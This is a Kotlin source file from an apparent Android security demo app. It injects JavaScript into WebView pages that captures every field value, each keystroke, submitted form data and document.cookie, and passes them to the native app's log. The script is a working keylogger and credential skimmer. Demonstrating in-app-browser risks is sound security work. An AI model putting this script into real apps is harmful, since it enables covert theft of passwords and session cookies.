package com.example.browsersecuritydemo.webview

import android.webkit.JavascriptInterface
import com.example.browsersecuritydemo.data.SecurityLogRepository
import com.example.browsersecuritydemo.model.InterceptedData
import org.json.JSONObject

class InputInterceptorBridge(
    private val source: String = "WebView",
    private val onDataIntercepted: ((InterceptedData) -> Unit)? = null
) {

    @JavascriptInterface
    fun onInputChanged(fieldName: String, fieldType: String, value: String, pageUrl: String) {
        val data = InterceptedData(
            source = source,
            eventType = "INPUT",
            fieldName = fieldName.ifEmpty { "(名無し要素)" },
            fieldType = fieldType.ifEmpty { "text" },
            value = value,
            pageUrl = pageUrl
        )
        SecurityLogRepository.addLog(data)
        onDataIntercepted?.invoke(data)
    }

    @JavascriptInterface
    fun onKeyStroke(fieldName: String, key: String, currentValue: String, pageUrl: String) {
        val data = InterceptedData(
            source = source,
            eventType = "KEYPRESS",
            fieldName = fieldName.ifEmpty { "(キー押下)" },
            fieldType = "key: $key",
            value = currentValue,
            pageUrl = pageUrl
        )
        SecurityLogRepository.addLog(data)
        onDataIntercepted?.invoke(data)
    }

    @JavascriptInterface
    fun onFormSubmit(formId: String, formDataJson: String, pageUrl: String) {
        val data = InterceptedData(
            source = source,
            eventType = "SUBMIT",
            fieldName = "Form: ${formId.ifEmpty { "default" }}",
            fieldType = "form_data",
            value = formDataJson,
            pageUrl = pageUrl
        )
        SecurityLogRepository.addLog(data)
        onDataIntercepted?.invoke(data)
    }

    @JavascriptInterface
    fun onCookieExtracted(cookies: String, pageUrl: String) {
        val data = InterceptedData(
            source = source,
            eventType = "COOKIE",
            fieldName = "Document.cookie",
            fieldType = "cookie",
            value = cookies,
            pageUrl = pageUrl
        )
        SecurityLogRepository.addLog(data)
        onDataIntercepted?.invoke(data)
    }

    companion object {
        const val INTERFACE_NAME = "AndroidSecurityBridge"

        /**
         * WebView内に注入するJavaScriptコード。
         * ユーザーの入力・キーストローク・フォーム送信・Cookieをネイティブアプリへ送信する。
         */
        val INJECTION_SCRIPT = """
            (function() {
                if (window.__security_inspector_injected) return;
                window.__security_inspector_injected = true;

                console.log("[AndroidSecurityBridge] Injection script active");

                function getElementIdentifier(el) {
                    return el.id || el.name || el.placeholder || el.className || el.tagName.toLowerCase();
                }

                function attachInputListeners(el) {
                    if (el.__security_attached) return;
                    el.__security_attached = true;

                    // 1文字入力されるごとに親アプリへ送信
                    el.addEventListener('input', function(e) {
                        try {
                            var name = getElementIdentifier(el);
                            var type = el.type || el.tagName.toLowerCase();
                            var val = el.value || '';
                            if (window.AndroidSecurityBridge && window.AndroidSecurityBridge.onInputChanged) {
                                window.AndroidSecurityBridge.onInputChanged(name, type, val, window.location.href);
                            }
                        } catch(err) { console.error(err); }
                    }, true);

                    // キーロガー的傍受
                    el.addEventListener('keydown', function(e) {
                        try {
                            var name = getElementIdentifier(el);
                            var key = e.key || '';
                            if (window.AndroidSecurityBridge && window.AndroidSecurityBridge.onKeyStroke) {
                                window.AndroidSecurityBridge.onKeyStroke(name, key, el.value || '', window.location.href);
                            }
                        } catch(err) { console.error(err); }
                    }, true);
                }

                function attachFormListeners(form) {
                    if (form.__security_form_attached) return;
                    form.__security_form_attached = true;

                    form.addEventListener('submit', function(e) {
                        try {
                            var formId = form.id || form.name || 'unnamed_form';
                            var formData = {};
                            var elements = form.elements;
                            for (var i = 0; i < elements.length; i++) {
                                var item = elements[i];
                                if (item.name && item.type !== 'submit' && item.type !== 'button') {
                                    formData[item.name] = item.value;
                                }
                            }
                            if (window.AndroidSecurityBridge && window.AndroidSecurityBridge.onFormSubmit) {
                                window.AndroidSecurityBridge.onFormSubmit(formId, JSON.stringify(formData), window.location.href);
                            }
                        } catch(err) { console.error(err); }
                    }, true);
                }

                // 既存要素へのアタッチ
                function scanAllInputs() {
                    var inputs = document.querySelectorAll('input, textarea, select');
                    inputs.forEach(attachInputListeners);

                    var forms = document.querySelectorAll('form');
                    forms.forEach(attachFormListeners);
                }

                scanAllInputs();

                // SPAなどで動的に要素が追加された場合も MutationObserver で検出
                var observer = new MutationObserver(function(mutations) {
                    scanAllInputs();
                });
                observer.observe(document.body || document.documentElement, {
                    childList: true,
                    subtree: true
                });

                // Cookieの抽出
                try {
                    if (document.cookie && window.AndroidSecurityBridge && window.AndroidSecurityBridge.onCookieExtracted) {
                        window.AndroidSecurityBridge.onCookieExtracted(document.cookie, window.location.href);
                    }
                } catch(e) {}
            })();
        """.trimIndent()
    }
}
